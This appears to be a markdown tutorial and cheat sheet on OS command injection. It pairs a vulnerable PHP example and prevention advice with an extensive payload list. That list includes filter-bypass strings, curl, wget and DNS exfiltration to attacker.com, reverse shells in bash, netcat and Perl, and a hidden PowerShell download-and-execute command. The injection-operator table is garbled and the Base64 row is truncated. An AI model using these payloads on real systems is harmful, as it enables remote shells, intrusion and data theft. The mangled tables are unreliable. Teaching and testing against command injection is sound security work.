## 🔍 What is OS Command Injection?

**OS Command Injection** is a security vulnerability that allows an attacker to execute arbitrary operating system commands on the server that is running an application.

### 🎯 Goal of the Attacker:

Gain unauthorized access to the system, steal data, escalate privileges, or gain persistence.

---

## 🧠 Basic Concept

- Many applications invoke system commands (e.g., `ping`, `ls`, `cat`) using functions like:
    
    - `system()`, `exec()`, `popen()` in C
        
    - `Runtime.getRuntime().exec()` in Java
        
    - `subprocess.call()` or `os.system()` in Python
        
- If user input is not properly sanitized, it can be exploited to execute malicious OS commands.
    

---

## 🛠️ Example of Vulnerable Code

### 🔧 PHP Example

php



`<?php $ip = $_GET['ip']; system("ping -c 3 " . $ip); ?>`

#### 🧨 Exploit:
`http://example.com/ping.php?ip=8.8.8.8;cat /etc/passwd`

#### 🧬 What Happens:
- The application runs: `ping -c 3 8.8.8.8;cat /etc/passwd`
    
- The output of `/etc/passwd` is shown to the attacker.
    

---

## 🧪 Types of OS Command Injection

### 1. **Blind Command Injection**

- Output is not directly visible to the attacker.
    
- Proved using time delay (`ping -c 10 127.0.0.1`) or DNS exfiltration.
    

### 2. **Classic Command Injection**

- Output of the command is directly displayed in the response.
    

---

## 🔗 Common Injection Operators (Linux)

| Operator    | Description                              |
| ----------- | ---------------------------------------- |
| `;`         | Command separator                        |
| `&&`        | Execute second command if first succeeds |
| `           |                                          |
| `           | `                                        |
| `$(...)`    | Command substitution                     |
| `` `...` `` | Command substitution                     |

---

## 🔒 Prevention Techniques

### ✅ Input Validation

- Allow only expected characters (whitelisting).
    
- Validate IPs with regex: `^(\d{1,3}\.){3}\d{1,3}$`
    

### ✅ Avoid Shell Execution

- Use safe libraries instead of passing user input to shell commands.
`import subprocess  subprocess.run(["ping", "-c", "3", user_input], check=True)`

### ✅ Escaping Input

- Properly escape inputs if shell invocation is unavoidable (not recommended alone).

### ✅ Least Privilege

- Run services with minimum required privileges to limit the impact.
    

---

## 🔍 Detection Techniques

### Manual Testing:

- Try injecting: `; ls`, `&& whoami`, `| netstat -an`
    

### Automated Tools:

- **OWASP ZAP**
    
- **Burp Suite**
    
- **Nikto**
    
- **Nmap NSE scripts**
    
- **Commix** (specifically for command injection)
    

---

## 🧰 Real-World Examples

### 1. **Metasploitable 2 – Mutillidae / DVWA**

- DVWA has an "OS Command Injection" module for practice.
    

### 2. **Equifax Breach (2017)**

- Related to Apache Struts, used OGNL injection that led to command execution.
    

---

## 🔁 Common Payload Examples
## 🧱 Basic Payloads

These work when there's no input sanitization:

127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 || ls -la
127.0.0.1 | uname -a
127.0.0.1 `id`
127.0.0.1 $(id)

---

## 🧬 Obfuscation & Bypass Techniques

These payloads can bypass basic filters:

| Method                             | Payload                              | Description                    |
| ---------------------------------- | ------------------------------------ | ------------------------------ |
| **Whitespace bypass**              | `127.0.0.1%0awhoami`                 | Uses newline encoding (`%0a`)  |
| **URL encoding**                   | `127.0.0.1%26%26id`                  | `&&` encoded as `%26%26`       |
| **Null byte**                      | `127.0.0.1%00`                       | Bypass string-based filters    |
| **Command substitution**           | `$(id)` or `` `id` ``                | Avoids direct use of `;`, `&&` |
| **Character injection**            | `ping$(echo${IFS}hello)`             | `${IFS}` as space              |
| **Unicode space**                  | `ping᠎-c᠎4᠎127.0.0.1`                | Zero-width space as separator  |
| **IFS (Internal Field Separator)** | `ping${IFS}-c${IFS}3${IFS}127.0.0.1` | Replace space                  |
| **Base64 + eval**                  | `echo aWQ=                           | base64 -d                      |

---

## 🧪 Time-Based Blind Injection Payloads

Useful when output is not visible:

`127.0.0.1 && sleep 10 127.0.0.1 | ping -c 10 127.0.0.1 ; sleep 5 ; ping -n 5 127.0.0.1  (Windows)`

---

## 🔗 Out-of-Band (OOB) Injection Payloads

Send request to attacker-controlled server:


``; curl http://attacker.com/$(whoami) ; wget http://attacker.com/`hostname` nslookup `whoami`.attacker.com ping $(whoami).attacker.com``

Test with Burp Collaborator, interact.sh, etc.

---

## 🦠 Reverse Shell Payloads

### Linux (Bash):
`bash -i >& /dev/tcp/attacker.com/4444 0>&1`

### Netcat (nc):
`nc attacker.com 4444 -e /bin/bash`

### Perl:
`perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");};'`

**Note**: Some systems don’t have `/bin/bash`, `nc`, or `perl`—use multiple methods.

---

## 🪟 Windows Command Injection Payloads

`127.0.0.1 & whoami 127.0.0.1 && dir 127.0.0.1 | net user & powershell -Command "whoami" & cmd /c calc`

### Windows Reverse Shell (PowerShell):

`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"`

---

## 🔐 WAF/Filter Evasion Tricks

- Change case: `WhoAmI`, `ID`, etc.
    
- Fragmentation: `who$@ami`
    
- Use variables: `${PATH:0:1}`
    
- Use environment variables: `$HOME`, `$USER`
    
- Use comments: `127.0.0.1#` to bypass suffix checks
    
- Mix with other injections: LFI + OS injection

---

## 🧪 Testing Tips

- Start with benign commands like `whoami`, `id`, `uname -a`
    
- Try time-based commands: `sleep 10`, `ping -c 5 127.0.0.1`
    
- Use DNS logging tools (e.g., Burp Collaborator, interact.sh) for blind injection
    

---

## 🛡️ Defense in Depth

|Defense Layer|Description|
|---|---|
|Input validation|Only accept well-formed input|
|Output encoding|Prevent command interpretation|
|Safe APIs|Use language-native system command libraries with parameters|
|Permissions|Isolate applications and limit OS permissions|
|WAF|May detect some payloads, but can be bypassed|